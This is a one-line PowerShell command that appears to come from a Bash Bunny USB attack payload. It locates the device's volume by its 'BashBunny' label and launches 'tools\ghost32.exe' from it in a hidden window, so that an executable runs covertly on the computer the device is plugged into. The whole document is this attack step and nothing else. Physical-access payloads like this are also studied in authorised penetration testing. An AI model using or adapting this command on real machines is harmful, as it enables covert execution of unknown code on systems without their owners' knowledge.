Start-Process -WindowStyle Hidden -FilePath ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'tools\ghost32.exe')
